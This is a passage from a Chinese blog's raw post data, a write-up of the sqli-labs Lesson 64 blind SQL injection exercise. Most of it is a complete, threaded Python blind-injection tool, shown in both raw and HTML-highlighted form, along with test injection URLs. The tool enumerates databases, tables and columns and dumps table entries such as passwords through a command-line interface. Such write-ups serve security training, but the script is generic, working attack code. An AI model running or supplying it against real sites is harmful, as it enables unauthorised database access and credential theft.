column in columns:\n            data = get_data(url, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--current-db', action='store_true',\n                      dest='cudbs', help='Retrieve DBMS current database')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url)\n    elif options.url and options.cudbs:\n        url = options.url\n        get_cu_db_name(url)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n","slug":"sqli-labs-lession-64-GET-盲注-变化3-仅允许130次请求","published":1,"updated":"2019-06-19T17:23:13.399Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istky009y4dsbgu08e90d","content":"<h1 id=\"sqli-labs-lession-64-GET-盲注-变化3-仅允许130次请求\"><a href=\"#sqli-labs-lession-64-GET-盲注-变化3-仅允许130次请求\" class=\"headerlink\" title=\"sqli-labs lession-64 GET-盲注-变化3-仅允许130次请求\"></a>sqli-labs lession-64 GET-盲注-变化3-仅允许130次请求</h1><hr>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p><code>&#39;</code>,<code>&quot;</code>,<code>&#39;)</code>,<code>&quot;)</code>,<code>))</code>常用案例依次测试。</p>\n<p><code>http://10.60.17.35:8082/Less-64/?id=1))+and+1=1%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-64/?id=1))+and+1=2%23</code></p>\n<h2 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h2><p><img src=\"/img/sql/Lesson-64/001.png\" alt=\"001\"></p>\n<p><img src=\"/img/sql/Lesson-64/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-64/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-64/004.png\" alt=\"004\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">feature = <span class=\"string\">'Your Login name'</span></span><br><span class=\"line\">head = <span class=\"string\">\"))\"</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).text</span><br><span class=\"line\">            <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_db_len</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT LENGTH(database())),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前数据库长度: %d'</span> % lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cu_db_name</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    lenth = get_db_len(url)</span><br><span class=\"line\">    dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" and ascii(substr((select database()),%d,1))\"</span> % (i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        dbname += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[*]'</span>, dbname)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d--+\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url)</span><br><span class=\"line\">    lenth = get_all_db_len(url, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + \\</span><br><span class=\"line\">                <span class=\"string\">\" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span 